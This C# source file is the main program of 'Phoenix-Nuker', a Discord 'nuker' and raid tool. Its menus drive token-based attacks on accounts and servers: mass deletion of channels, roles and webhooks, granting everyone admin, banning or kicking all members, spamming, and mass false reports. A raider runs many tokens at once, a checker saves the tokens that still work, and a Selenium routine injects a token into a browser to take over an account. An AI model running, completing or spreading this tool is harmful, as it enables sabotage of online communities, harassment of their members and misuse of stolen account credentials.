﻿using Newtonsoft.Json;
using System.Drawing;
using Console = Colorful.Console;
using System.Diagnostics;
using System.Reflection;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium;

/* 
       │ Author       : extatent
       │ Name         : Phoenix-Nuker
       │ GitHub       : https://github.com/extatent
*/

namespace Phoenix
{
    class Program
    {
        #region Configuration
        static string? token;
        static readonly List<string> clients = new List<string>();
        static ulong? guildid;

        static void GetConfig()
        {
            dynamic? json = JsonConvert.DeserializeObject(File.ReadAllText("config.json"));
            if (json != null)
                token = json.token;
        }

        static void SaveConfig(string token)
        {
            string json = JsonConvert.SerializeObject(new { token });
            File.WriteAllText("config.json", json);
        }
        #endregion

        #region Write Logo
        static void WriteLogo()
        {
            Console.Clear();
            Console.WriteLine();
            string phoenix = @"                                  ██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗
                                  ██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝
                                  ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
                                  ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
" + " > GitHub: github.com/extatent" + @"    ██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
" + " > Discord: dsc.gg/extatent " + @"      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                      ";
            Console.WriteWithGradient(phoenix, Color.OrangeRed, Color.Yellow, 6);
            Console.WriteLine();
        }
        #endregion

        #region Main
        static void Main()
        {
            Console.Title = "Phoenix Nuker";
            Start();
        }
        #endregion

        #region Done Method
        enum Method
        {
            Account = 0,
            Server = 1,
            Options = 2,
            Raider = 3
        }

        static void DoneMethod(Method option)
        {
            Console.ForegroundColor = Color.Yellow;
            if (option == Method.Account)
            {
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                AccountNuker();
            }
            else if (option == Method.Server)
            {
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                ServerNuker();
            }
            else if (option == Method.Options)
            {
                Thread.Sleep(3000);
                Options();
            }
            else if (option == Method.Raider)
            {
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Raider();
            }
        }
        #endregion

        #region Start
        static void Start()
        {
            try
            {
                if (!File.Exists("config.json"))
                {
                    File.Create("config.json").Dispose();
                    File.WriteAllText("config.json", "{\"token\":\"\"}");
                }

                if (!File.Exists("tokens.txt"))
                    File.Create("tokens.txt").Dispose();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message + "\n\nPress any key to exit.");
                Console.ReadKey();
                Environment.Exit(0);
            }

            GetConfig();
            Login();
        }
        #endregion

        #region Login
        static void Login()
        {
            try
            {
                WriteLogo();
                string options2 = @"╔════════════════════════╗
║ [01] Login             ║
║ [02] MultiToken Raider ║
║ [03] Exit              ║
╚════════════════════════╝

";
                Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
                Console.ForegroundColor = Color.Yellow;
                Console.Write("Your choice: ");
                int options = int.Parse(Console.ReadLine());
                switch (options)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(2000);
                        Console.Clear();
                        Login();
                        break;
                    case 1:
                        if (string.IsNullOrEmpty(token))
                        {
                            WriteLogo();
                            Console.Write("Token: ");
                            string Token = Console.ReadLine();

                            if (Token.Contains('\"'))
                                Token = Token.Replace("\"", "");

                            if (Token.Contains('\''))
                                Token = Token.Replace("'", "");

                            SaveConfig(Token);
                            token = Token;
                        }
                        break;
                    case 2:
                        var list = File.ReadAllLines("tokens.txt");
                        int count = 0;
                        foreach (var token in list)
                        {
                            count++;
                            clients.Add(token);
                        }
                        if (count == 0)
                        {
                            WriteLogo();
                            Console.WriteLine("Paste your tokens in tokens.txt file.");
                            Thread.Sleep(3000);
                            Login();
                        }
                        Console.Title = "Phoenix Nuker | Total Accounts: " + count;
                        Raider();
                        break;
                    case 3:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Login();
            }

            try
            {
                Request.SendGet($"/users/@me", token);
            }
            catch
            {
                Config.IsBot = true;
            }

            if (User.GetUsername(token) == "N/A")
            {
                WriteLogo();
                Console.ForegroundColor = Color.Yellow;
                Console.WriteLine("Invalid authentication token.");
                token = "";
                SaveConfig("");
                Thread.Sleep(3000);
                Login();
            }

            Options();
        }
        #endregion

        #region Options
        static void Options()
        {
            try
            {
                WriteLogo();
                Console.Title = $"Phoenix Nuker | " + User.GetUsername(token);

                string options = @"
╔═════════════════════════════════════════════════╗
║ [01] Account Nuker   [06] Login To Account      ║
║ [02] Server Nuker    [07] Export Data           ║
║ [03] Webhook Spammer [08] Enter Another Account ║
║ [04] Delete Webhook  [09] Go Back               ║
║ [05] Report Bot      [10] Exit                  ║
╚═════════════════════════════════════════════════╝

";
                Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
                Console.ForegroundColor = Color.Yellow;
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        DoneMethod(Method.Options);
                        break;
                    case 1:
                        Console.Title = $"Phoenix Nuker | {User.GetUsername(token)}";
                        AccountNuker();
                        break;
                    case 2:
                        WriteLogo();
                        if (string.IsNullOrEmpty(guildid.ToString()))
                        {
                            Console.Write("Guild ID: ");
                            ulong? GuildID = ulong.Parse(Console.ReadLine());
                            guildid = GuildID;
                        }
                        if (Server.GetServerName(token, guildid) == "N/A")
                        {
                            WriteLogo();
                            Console.WriteLine("Invalid ID or you're not in the server.");
                            guildid = ulong.Parse("");
                            Thread.Sleep(3000);
                            Options();
                        }
                        Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Server.GetServerName(token, guildid)}";
                        ServerNuker();
                        break;
                    case 3:
                        WriteLogo();
                        Console.Write("Webhook URL: ");
                        string webhook = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Message: ");
                        string message = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count: ");
                        int mcount = int.Parse(Console.ReadLine());
                        WriteLogo();
                        webhook = webhook.Replace("https://discord.com/api/webhooks/", "");
                        ulong? wid = ulong.Parse(webhook.Split('/')[0]);
                        string wtoken = webhook.Split('/')[1];
                        int total = 0;
                        for (int i = 0; i < mcount; i++)
                        {
                            total++;
                            Server.SendWebhookMessage(token, wid, wtoken, message);
                            Console.WriteLine("Messages sent: " + total);
                        }
                        DoneMethod(Method.Options);
                        break;
                    case 4:
                        WriteLogo();
                        Console.Write("Webhook URL/ID: ");
                        ulong? wid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Server.DeleteWebhook(token, wid2);
                        Console.WriteLine("Done");
                        DoneMethod(Method.Options);
                        break;
                    case 5:
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? gid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options2 = @"╔═════════════════════════════╗
║ [01] Illegal Content        ║
║ [02] Harrassment            ║
║ [03] Spam Or Phishing Links ║
║ [04] Self Harm              ║
║ [05] NSFW                   ║
╚═════════════════════════════╝

";
                        Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 3);
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write("Your choice: ");
                        int reason = int.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Reports count: ");
                        int count = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int reports = 0;
                        for (int i = 0; i < count; i++)
                        {
                            Server.ReportMessage(token, gid, cid, mid, reason);
                            reports++;
                            Console.WriteLine("Reports sent: " + reports);
                        }
                        DoneMethod(Method.Options);
                        break;
                    case 6:
                        WriteLogo();
                        SeleniumLogin(token);
                        DoneMethod(Method.Options);
                        break;
                    case 7:
                        WriteLogo();
                        string options3 = @"╔═════════════════════╗
║ [01] Export Account ║
║ [02] Export Server  ║
╚═════════════════════╝

";
                        Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 3);
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write("Your choice: ");
                        int choice = int.Parse(Console.ReadLine());
                        if (choice == 1)
                        {
                            WriteLogo();
                            User.ExportAccount(token);
                        }
                        else if (choice == 2)
                        {
                            WriteLogo();
                            Console.Write("Guild ID: ");
                            ulong? gid2 = ulong.Parse(Console.ReadLine());
                            WriteLogo();
                            Server.ExportServer(token, gid2);
                        }
                        DoneMethod(Method.Options);
                        break;
                    case 8:
                        if (File.Exists("config.json"))
                            File.Delete("config.json");
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                        break;
                    case 9:
                        Console.Title = "Phoenix Nuker";
                        Login();
                        break;
                    case 10:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Options();
            }
        }
        #endregion

        #region Selenium Login
        static void SeleniumLogin(string? token)
        {
            try
            {
                if (!File.Exists("chromedriver.exe"))
                {
                    Console.ForegroundColor = Color.Yellow;
                    Console.WriteLine("Chromedriver is missing.\nChromedriver must be in the same folder as Phoenix.\nChromedriver must match your Chrome version.\nPress any key to download.");
                    Console.ReadKey();
                    Process.Start(new ProcessStartInfo("http://chromedriver.storage.googleapis.com/index.html") { UseShellExecute = true });
                    Options();
                }

                Console.WriteLine("Please wait");

                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.EnableVerboseLogging = false;
                service.SuppressInitialDiagnosticInformation = true;
                service.HideCommandPromptWindow = true;

                ChromeOptions options = new ChromeOptions();
                options.AddArgument("--disable-logging");
                options.AddArguments("--mute-audio");
                options.AddArguments("--disable-extensions");
                options.AddArguments("--disable-notifications");
                options.AddArguments("--disable-application-cache");
                options.AddArguments("--no-sandbox");
                options.AddArgument("--disable-crash-reporter");
                options.AddArguments("--disable-dev-shm-usage");
                options.AddArguments("--disable-gpu");
                options.AddArgument("--ignore-certificate-errors");
                options.AddArguments("--disable-infobars");
                options.AddArgument("--silent");

                IWebDriver driver = new ChromeDriver(service, options);
                driver.Url = "https://discord.com/login";

                IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
                execute.ExecuteScript($"let token = \"{token}\"; function login(token) {{ setInterval(() => {{ document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${{token}}\"` }}, 50); setTimeout(() => {{ location.reload(); }}, 2500); }} login(token);");
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Options();
            }
        }
        #endregion

        #region Raider
        static void Raider()
        {
            try
            {
                WriteLogo();
                string options = @"╔═════════════════════════════════════════════════════════════╗
║ [01] Join Guild/Group [06] Block User     [11] Check Tokens ║
║ [02] Leave Guild      [07] DM User        [12] Go Back      ║
║ [03] Add Friend       [08] Leave Group    [13] Exit         ║
║ [04] Spam             [09] Trigger Typing                   ║
║ [05] Add Reaction     [10] Report Message                   ║
╚═════════════════════════════════════════════════════════════╝

";
                Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
                Console.ForegroundColor = Color.Yellow;
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(3000);
                        Raider();
                        break;
                    case 1:
                        WriteLogo();
                        Console.Write("Invite code: ");
                        string code = Console.ReadLine();
                        if (code.Contains("https://discord.gg/"))
                            code = code.Replace("https://discord.gg/", "");
                        if (code.Contains("https://discord.com/invite/"))
                            code = code.Replace("https://discord.com/invite/", "");
                        WriteLogo();
                        foreach (var joinguild in clients)
                            Raid.JoinGuild(joinguild, code);
                        DoneMethod(Method.Raider);
                        break;
                    case 2:
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? id = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in clients)
                            Raid.LeaveGuild(token, id);
                        DoneMethod(Method.Raider);
                        break;
                    case 3:
                        WriteLogo();
                        Console.Write("Full Username: ");
                        string full = Console.ReadLine();
                        string user = full.Split('#')[0];
                        uint discriminator = uint.Parse(full.Split('#')[1]);
                        WriteLogo();
                        foreach (var token in clients)
                            Raid.AddFriend(token, user, discriminator);
                        DoneMethod(Method.Raider);
                        break;
                    case 4:
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message: ");
                        string msg = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count: ");
                        int count = int.Parse(Console.ReadLine());
                        WriteLogo();
                        for (int i = 0; i < count; i++)
                        {
                            foreach (var token in clients)
                                Raid.SendMessage(token, cid, msg);
                        }
                        DoneMethod(Method.Raider);
                        break;
                    case 5:
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options2 = @"╔════════════════════════════════════════════════════════════╗
║ [01] Heart                [06] Billed Cap                  ║
║ [02] White Check Mark     [07] Negative Squared Cross Mark ║
║ [03] Regional Indicator L [08] Neutral Face                ║
║ [04] Regional Indicator W [09] Nerd Face                   ║
║ [05] Middle Finger        [10] Joy                         ║
╚════════════════════════════════════════════════════════════╝

";
                        Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write("Your choice: ");
                        string choice = Console.ReadLine();
                        WriteLogo();
                        if (choice == "1")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "❤️");
                        }
                        if (choice == "2")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "✅");
                        }
                        if (choice == "3")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "🇱");
                        }
                        if (choice == "4")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "🇼");
                        }
                        if (choice == "5")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "🖕");
                        }
                        if (choice == "6")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "🧢");
                        }
                        if (choice == "7")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "❎");
                        }
                        if (choice == "8")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "😐");
                        }
                        if (choice == "9")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "🤓");
                        }
                        if (choice == "10")
                        {
                            foreach (var token in clients)
                                Raid.AddReaction(token, cid2, mid, "😂");
                        }
                        DoneMethod(Method.Raider);
                        break;
                    case 6:
                        WriteLogo();
                        Console.Write("User ID: ");
                        ulong? uid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in clients)
                            Raid.BlockUser(token, uid2);
                        DoneMethod(Method.Raider);
                        break;
                    case 7:
                        WriteLogo();
                        Console.Write("User ID: ");
                        ulong? uid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message: ");
                        string msg2 = Console.ReadLine();
                        WriteLogo();
                        foreach (var token in clients)
                            Raid.DMUser(token, uid, msg2);
                        DoneMethod(Method.Raider);
                        break;
                    case 8:
                        WriteLogo();
                        Console.Write("Group ID: ");
                        ulong? gid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in clients)
                            Raid.LeaveGroup(token, gid);
                        DoneMethod(Method.Raider);
                        break;
                    case 9:
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid4 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in clients)
                            Raid.TriggerTyping(token, cid4);
                        DoneMethod(Method.Raider);
                        break;
                    case 10:
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? gid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid3 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options3 = @"╔═════════════════════════════╗
║ [01] Illegal Content        ║
║ [02] Harrassment            ║
║ [03] Spam Or Phishing Links ║
║ [04] Self Harm              ║
║ [05] NSFW                   ║
╚═════════════════════════════╝

";
                        Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 3);
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write("Your choice: ");
                        int reason = int.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in clients)
                            Raid.ReportMessage(token, gid2, cid3, mid2, reason);
                        DoneMethod(Method.Raider);
                        break;
                    case 11:
                        WriteLogo();
                        Console.ReplaceAllColorsWithDefaults();
                        foreach (var token in clients)
                        {
                            try
                            {
                                Request.SendGet("/users/@me", token);
                                Console.WriteLine(token, Color.Lime);
                                File.AppendAllText("WorkingTokens.txt", token + Environment.NewLine);
                            } catch { Console.WriteLine(token, Color.Red); }
                        }
                        Console.ForegroundColor = Color.Yellow;
                        Console.WriteLine("Working tokens were saved to WorkingTokens.txt");
                        DoneMethod(Method.Raider);
                        break;
                    case 12:
                        Console.Title = "Phoenix Nuker";
                        Start();
                        break;
                    case 13:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Raider();
            }
        }
        #endregion

        #region Account Nuker
        static void AccountNuker()
        {
            try
            {
                WriteLogo();
                string options2 = @"╔═══════════════════════════════════════════════════════════════════╗
║ [01] Edit Profile        [07] Mass Create Guilds  [13] Delete DMs ║
║ [02] Leave/Delete Guilds [08] Seizure Mode        [14] Go Back    ║
║ [03] Clear Relationships [09] Confuse Mode        [15] Exit       ║
║ [04] Leave HypeSquad     [10] Mass DM                             ║
║ [05] Remove Connections  [11] User Info                           ║
║ [06] Deauthorize Apps    [12] Block Relationships                 ║
╚═══════════════════════════════════════════════════════════════════╝

";
                Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
                Console.ForegroundColor = Color.Yellow;
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(3000);
                        AccountNuker();
                        break;
                    case 1:
                        WriteLogo();
                        string options3 = @"╔═════════════════╗
║ [00] None       ║
║ [01] Bravery    ║
║ [02] Brilliance ║
║ [03] Balance    ║
╚═════════════════╝

";
                        Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 7);
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write("Your choice: ");
                        string hypesquad = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Biography: ");
                        string bio = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Custom Status: ");
                        string status = Console.ReadLine();
                        WriteLogo();
                        User.EditProfile(token, hypesquad, bio, status);
                        DoneMethod(Method.Account);
                        break;
                    case 2:
                        WriteLogo();
                        User.LeaveDeleteGuilds(token);
                        DoneMethod(Method.Account);
                        break;
                    case 3:
                        WriteLogo();
                        User.ClearRelationships(token);
                        DoneMethod(Method.Account);
                        break;
                    case 4:
                        WriteLogo();
                        User.LeaveHypeSquad(token);
                        DoneMethod(Method.Account);
                        break;
                    case 5:
                        WriteLogo();
                        User.RemoveConnections(token);
                        DoneMethod(Method.Account);
                        break;
                    case 6:
                        WriteLogo();
                        User.DeauthorizeApps(token);
                        DoneMethod(Method.Account);
                        break;
                    case 7:
                        WriteLogo();
                        Console.Write("Guild name: ");
                        string name = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 100): ");
                        int count = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            numb++;
                            User.CreateGuild(token, name);
                            Console.WriteLine($"Created: {numb}");
                        }
                        DoneMethod(Method.Account);
                        break;
                    case 8:
                        WriteLogo();
                        Console.Write("Count: ");
                        int count2 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb2 = 0;
                        for (int i = 0; i < count2; i++)
                        {
                            numb2++;
                            User.ChangeTheme(token, "light");
                            User.ChangeTheme(token, "dark");
                            Console.WriteLine($"Changed: {numb2}");
                        }
                        DoneMethod(Method.Account);
                        break;
                    case 9:
                        WriteLogo();
                        User.ConfuseMode(token);
                        DoneMethod(Method.Account);
                        break;
                    case 10:
                        WriteLogo();
                        Console.Write("Message: ");
                        string message = Console.ReadLine();
                        WriteLogo();
                        User.MassDM(token, message);
                        DoneMethod(Method.Account);
                        break;
                    case 11:
                        WriteLogo();
                        User.UserInformation(token);
                        AccountNuker();
                        break;
                    case 12:
                        WriteLogo();
                        User.BlockRelationships(token);
                        DoneMethod(Method.Account);
                        break;
                    case 13:
                        WriteLogo();
                        User.DeleteDMs(token);
                        DoneMethod(Method.Account);
                        break;
                    case 14:
                        WriteLogo();
                        Options();
                        break;
                    case 15:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                AccountNuker();
            }
        }
        #endregion

        #region Server Nuker
        static void ServerNuker()
        {
            try
            {
                WriteLogo();
                string options = @"╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║ [01] Delete Roles         [09] Remove Integrations          [17] Mass Create Invites           ║
║ [02] Remove All Bans      [10] Remove All Reactions         [18] Delete Guild Scheduled Events ║
║ [03] Delete All Channels  [11] Server Info                  [19] Delete Guild Template         ║
║ [04] Delete All Emojis    [12] Leave/Delete Server          [20] Delete Stage Instances        ║
║ [05] Delete All Invites   [13] Msg In Every Channel         [21] Delete Webhooks               ║
║ [06] Mass Create Roles    [14] Delete Stickers              [22] Switch To Other Server        ║
║ [07] Mass Create Channels [15] Grant Everyone Admin         [23] Go Back                       ║
║ [08] Prune Members        [16] Delete Auto Moderation Rules [24] Exit                          ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝

";
                Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);

                if (Config.IsBot == true)
                {
                    string options2 = @"╔═══════════════════════╗
║ [25] Ban All Members  ║
║ [26] Kick All Members ║
║ [27] Rename Everyone  ║
╚═══════════════════════╝

";
                    Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
                }

                Console.ForegroundColor = Color.Yellow;
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(3000);
                        ServerNuker();
                        break;
                    case 1:
                        WriteLogo();
                        Server.DeleteRoles(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 2:
                        WriteLogo();
                        Server.RemoveBans(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 3:
                        WriteLogo();
                        Server.DeleteChannels(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 4:
                        WriteLogo();
                        Server.DeleteEmojis(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 5:
                        WriteLogo();
                        Server.DeleteInvites(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 6:
                        WriteLogo();
                        Console.Write("Role name: ");
                        string name = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 250): ");
                        int count = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            numb++;
                            Server.CreateRole(token, guildid, name);
                            Console.WriteLine("Created: " + numb, Color.Lime);
                        }
                        DoneMethod(Method.Server);
                        break;
                    case 7:
                        WriteLogo();
                        Console.Write("Channel name: ");
                        string name2 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 500): ");
                        int count2 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb2 = 0;
                        for (int i = 0; i < count2; i++)
                        {
                            numb2++;
                            Server.CreateChannel(token, guildid, name2);
                            Console.WriteLine("Created: " + numb2, Color.Lime);
                        }
                        DoneMethod(Method.Server);
                        break;
                    case 8:
                        WriteLogo();
                        Server.PruneMembers(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 9:
                        WriteLogo();
                        Server.RemoveIntegrations(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 10:
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Server.DeleteAllReactions(token, cid, mid);
                        DoneMethod(Method.Server);
                        break;
                    case 11:
                        WriteLogo();
                        Server.ServerInformation(token, guildid);
                        ServerNuker();
                        break;
                    case 12:
                        WriteLogo();
                        Server.LeaveDeleteGuild(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 13:
                        WriteLogo();
                        string options3 = @"╔══════════════════╗
║ [01] Spam        ║
║ [02] One Message ║
╚══════════════════╝

";
                        Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 7);
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write("Your choice: ");
                        string choice = Console.ReadLine();
                        if (choice == "1")
                        {
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            WriteLogo();
                            Console.Write("Messages count: ");
                            int count3 = int.Parse(Console.ReadLine());
                            WriteLogo();
                            for (int i = 0; i < count3; i++)
                                Server.MsgInEveryChannel(token, guildid, msg);
                        }
                        else
                        {
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            WriteLogo();
                            Server.MsgInEveryChannel(token, guildid, msg);
                        }
                        DoneMethod(Method.Server);
                        break;
                    case 14:
                        WriteLogo();
                        Server.DeleteStickers(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 15:
                        WriteLogo();
                        Server.GrantEveryoneAdmin(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 16:
                        WriteLogo();
                        Server.DeleteAutoModerationRules(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 17:
                        WriteLogo();
                        Server.CreateInvite(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 18:
                        WriteLogo();
                        Server.DeleteGuildScheduledEvents(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 19:
                        WriteLogo();
                        Server.DeleteGuildTemplate(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 20:
                        WriteLogo();
                        Server.DeleteStageInstances(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 21:
                        WriteLogo();
                        Server.DeleteWebhooks(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 22:
                        WriteLogo();
                        if (string.IsNullOrEmpty(guildid.ToString()))
                        {
                            Console.Write("Guild ID: ");
                            ulong? GuildID = ulong.Parse(Console.ReadLine());
                            guildid = GuildID;
                        }
                        if (Server.GetServerName(token, guildid) == "N/A")
                        {
                            WriteLogo();
                            Console.WriteLine("Invalid ID or you're not in the server.");
                            guildid = ulong.Parse("");
                            Thread.Sleep(3000);
                            Options();
                        }
                        Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Server.GetServerName(token, guildid)}";
                        ServerNuker();
                        break;
                    case 23:
                        WriteLogo();
                        Options();
                        break;
                    case 24:
                        Environment.Exit(0);
                        break;
                    case 25:
                        WriteLogo();
                        Bot.BanAllMembers(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 26:
                        WriteLogo();
                        Bot.KickAllMembers(token, guildid);
                        DoneMethod(Method.Server);
                        break;
                    case 27:
                        WriteLogo();
                        Console.Write("Nickname: ");
                        string nick = Console.ReadLine();
                        WriteLogo();
                        Bot.ChangeAllNicknames(token, guildid, nick);
                        DoneMethod(Method.Server);
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                ServerNuker();
            }
        }
        #endregion
    }
}